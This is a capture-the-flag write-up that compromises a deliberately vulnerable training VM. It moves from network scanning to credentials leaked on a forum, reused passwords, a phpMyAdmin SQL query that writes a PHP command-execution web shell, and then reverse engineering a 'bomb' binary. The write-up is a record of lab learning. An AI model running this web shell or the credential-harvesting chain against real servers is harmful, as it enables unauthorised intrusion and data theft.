## IP and Ports

Obtaining IP address of the virtual machine, and it's open ports

First, we need to find what our `Bridged Adaptor` name is.

![VirtualBox](assets/VirtualBox.png)

Here, it's `wlp2s0`

Now we would like to know the ip address of this interface:

```sh
ip a | grep -A 2 wlp2s0:
2: wlp2s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether 14:4f:8a:04:eb:5b brd ff:ff:ff:ff:ff:ff
    inet 192.168.1.40/24 brd 192.168.1.255 scope global dynamic noprefixroute wlp2s0
```

With this information between our hands, we will get the IP adresses behind this interface :

```sh
nmap -sn 192.168.1.40/24              
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 11:38 CET
...
Nmap scan report for 192.168.1.7
Host is up (0.0013s latency).
...
```

A couple of adresses show up, but only one is missing when the VM is shutdown. We will use it.

```sh
nmap 192.168.1.7                
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 11:40 CET
Nmap scan report for 192.168.1.7
Host is up (0.00018s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps

Nmap done: 1 IP address (1 host up) scanned in 0.17 seconds
```

Alternative (macOS):

* get the name and ip of the host by launching ```nmap``` on the subnet
```
➜  boot2root git:(master) nmap -sn 192.168.1.0/24
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-29 14:02 CET

Host is up (0.00080s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.50 seconds
```
* get the open ports:
```

Nmap done: 1 IP address (1 host up) scanned in 4.73 seconds
```

## Web Path Scanner

It exist an automated tool for `web path scanner` : [Dirsearch](https://github.com/maurosoria/dirsearch)

Let's make a search for http: (I will format output to only keep the interesting ones, aka removing responses 403)

```sh
python3 dirsearch.py -u http://192.168.1.7/

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm, js | HTTP method: GET | Threads: 30 | Wordlist size: 11793

[12:20:02] 200 -    1KB - /index.html

Task Completed
```

Let's do the same thing for https:

```sh
python3 dirsearch.py -u https://192.168.1.7/

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

## Exploring the forum

Accessing [https://192.168.1.7/forum/](https://192.168.1.7/forum/)

One post attract our attention: [https://192.168.1.7/forum/index.php?id=6](https://192.168.1.7/forum/index.php?id=6)
```
Probleme login ? - lmezard, 2015-10-08, 00:10
```
User `lmezard` as troubles login in, and copy paste to us some commandline output.

During his numerous attempts, it mixes up one time his username and password:

```sh
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

we can now connect to the forum using:

```
user: lmezard
pass: !q\]Ej?*5K5cy*AJ
```

and we can now obtain this user email address :

```
laurie@borntosec.net
```

## Reading lmezard emails

Accessing [https://192.168.1.7/webmail/](https://192.168.1.7/webmail/)

with the following credentials (yes this user kept the same password between the forum and his webmail account!):
```
user: laurie@borntosec.net
pass: !q\]Ej?*5K5cy*AJ
```

One mail with object `DB Access` obviously attract our attention:

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

## Exploiting phpmyadmin

Accessing [https://192.168.1.7/phpmyadmin/index.php](https://192.168.1.7/phpmyadmin/index.php/)

with the following credentials:

```
user: root
pass: Fg-'kKXBj87E:aJ$
```

we would like to have a shell access, which we could do by writing ourselves a page specially for it with a SQL request.
For this we need a folder with write rights.

Luckily for us, they use the template [my little forum](https://github.com/ilosuna/mylittleforum) for the forum.

Reading the README.md, one detail attract our attention :

```
Depending on your server configuration the write permissions of the subdirectory templates_c (CHMOD 770, 775 or 777) and the file config/db_settings.php (CHMOD 666) might need to be changed in order that they are writable by the script.
```

we now know where to write : `/var/www/forum/templates_c/`!

```sql
SELECT "<html><body><form method=\"GET\" name=\"<?php echo basename($_SERVER['PHP_SELF']); ?>\"><input type=\"TEXT\" name=\"cmd\" id=\"cmd\" size=\"80\"><input type=\"SUBMIT\" value=\"Execute\"></form><pre><?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?> </pre> </body><script>document.getElementById(\"cmd\").focus();</script></html>"
INTO OUTFILE '/var/www/forum/templates_c/cmd.php'
```

we can now access this shell interface with [https://192.168.1.7/forum/templates_c/cmd.php](https://192.168.1.7/forum/templates_c/cmd.php)

looking at the home :

```sh
ls /home
LOOKATME
ft_root
laurie
laurie@borntosec.net
lmezard
thor
zaz
```

`LOOKATME` is a directory containing only a file named `password`, let's cat it:

```sh
cat /home/LOOKATME/password
lmezard:G!@M6f4Eatau{sF"
```

It's a password containing the credentials to user `lmezard` for conencting to the vm.

Ther was multiple open ports discovered at the 1st step, let's check for ssh and ftp :

Having a look at `sshd_config` let us know we will not be able to ssh with it.

```sh
cat /etc/ssh/sshd_config | grep AllowUsers
AllowUsers ft_root zaz thor laurie
```

Having a look for ftp configuration:
```sh
cat /etc/ftpusers
# /etc/ftpusers: list of users disallowed FTP access. See ftpusers(5).
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
nobody
```
we will be able to use ftp !

## lmezard user

With the previously discovered credentials:

```
user: lmezard
pass: G!@M6f4Eatau{sF"
```

let's connect with ftp

```sh
ftp 192.168.1.7 21
Connected to 192.168.1.7.
220 Welcome on this server
Name (192.168.1.7:ezalos): lmezard
331 Please specify the password.

ftp> 221 Goodbye.
```

let's have a look at the README:
```sh
cat README
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

The fun file is pretty mixed up, but with the help of python and some regex we get it back to an useable c file !

```sh
python3 ./scripts/fun.py fun > out.c && gcc out.c -o let_the_fun_begin && ./let_the_fun_begin
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit%                        
```

Following the instructions:

```sh
echo -n  Iheartpwnage | shasum -a 256
330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4  -
```

we can now connect to ssh !

## SSH laurie

Connecting by ssh with the following credentials:
```sh
user: laurie
pass: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
```

we want to obtain her home directory:

```sh
scp -r laurie@192.168.1.7:~ .
```
There's 2 files of interests, `README` and `bomb` which is a program

```sh
cat README  
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```

### Phase 1

The program is just comparing our input against `Public speaking is very easy.`

```sh
./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
```

### Phase 2

The program waits for the factorials of 1 to 6

```sh
1 2 6 24 120 720
That's number 2.  Keep going!
```

### Phase 3

The program awaits for an int, then a char and finally another number.
Having a look through a debugger we see that 3 inputs will match the hint in `README` and not make the bomb explode

```
1 b 214
2 b 755
7 b 524
```

using the 1st one for demonstration:

```sh
1 b 214
Halfway there!
```

### Phase 4

The program will calculate the umpteenth number of the Fibonacci sequence and compare it to `0x37`, or in decimal `55`.

```
umpteenth:	0	1	2	3	4	5	6	7	8	9	10
value:		0	1	1	2	3	5	8	13	21	34	55
```

The code is a little messed up, as it starts with (1, 1), and not (0, 1), so we need to use `9`

```sh
9
So you got that one.  Try this one.
```

if we input `9 austinpowers` it will later unlock a secret phase.

### Phase 5

The program take as input a string:
 * Then takes each character value
 * Keeps the 4 less significative bits
 * Use them as index with the string `isrveawhobpnutfg` to construct a new string
 * Which it the compares with `giants`.

| string | i   | s   | r   | v   | e   | a   | w   | h   | o   | b   | p   | n   | u   | t   | f   | g   |
|--------|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|-----|
|        | 0   | 1   | 2   | 3   | 4   | 5   | 6   | 7   | 8   | 9   | 10  | 11  | 12  | 13  | 14  | 15  |
|        | 0x0 | 0x1 | 0x2 | 0x3 | 0x4 | 0x5 | 0x6 | 0x7 | 0x8 | 0x9 | 0xa | 0xb | 0xc | 0xd | 0xe | 0xf |

Multiple possibilities:


| desired output                        | g   | i   | a   | n   | t   | s   |
|---------------------------------------|-----|-----|-----|-----|-----|-----|
| character index in `isrveawhobpnutfg` | 15  | 0   | 5   | 11  | 13  | 1   |
|                                       | 0xf | 0x0 | 0x5 | 0xb | 0xd | 0x1 |
| Candidates in minuscules              | o   | p   | e   | k   | m   | a   |
|                                       |     |     | u   |     |     | q   |

Using the 1st possibility for demonstration:

```sh
opekma
Good work!  On to the next...
```

### Phase 6

The program possess a linked list with value from 1 to 6, and will compare our input to them.

It also makes sure all numbers are different and less or equal than 6.

We made a little script to bruteforce it which can be used this way:

```
python3 phase_6.py ./bomb
Input:  Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekma
4 2 6 3 1 5

Ouptut:  b"Welcome this is my little bomb !!!! You have 6 stages with\nonly one life good luck !! Have a nice day!\nPhase 1 defused. How about the next one?\nThat's number 2.  Keep going!\nHalfway there!\nSo you got that one.  Try this one.\nGood work!  On to the next...\nCongratulations! You've defused the bomb!\n"
Here is the password:  Publicspeakingisveryeasy.126241207201b2149opekma426315
```

```sh
4 2 6 3 1 5
Congratulations! You've defused the bomb!
```

### Secret phase

It's optional, and of no use.
The answer needs to be above 1000, and some other constrain, but after luckily trying `1001` as our first try we found it!

```sh
./bomb
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9 austinpowers
So you got that one.  Try this one.
opekma
Good work!  On to the next...
4 2 6 3 1 5
Curses, you've found the secret phase!
But finding it and solving it are quite different...
1001
Wow! You've defused the secret stage!
Congratulations! You've defused the bomb!
```


### Finding thor ssh password

Here are all the different valid possibilites:

```
Publicspeakingisveryeasy.12624120720*****9op*km*426315

Publicspeakingisveryeasy.126241207201b2149opekma426315
Publicspeakingisveryeasy.126241207202b7559opekma426315
Publicspeakingisveryeasy.126241207207b5249opekma426315

Publicspeakingisveryeasy.126241207201b2149opukma426315

Publicspeakingisveryeasy.126241207207b5249opukma426315

Publicspeakingisveryeasy.126241207201b2149opekmq426315
Publicspeakingisveryeasy.126241207202b7559opekmq426315
Publicspeakingisveryeasy.126241207207b5249opekmq426315

Publicspeakingisveryeasy.126241207207b5249opukmq426315
```

None of them works.

Going through slack/stackoverflow we found out that the password is messed up and you need invert characters n-1 and n-2.

Link to the relevant post on stackoverflow :
[https://stackoverflow.com/c/42network/questions/664](https://stackoverflow.com/c/42network/questions/664)

Finally the working password is : `Publicspeakingisveryeasy.126241207201b2149opekmq426135`

## SSH thor
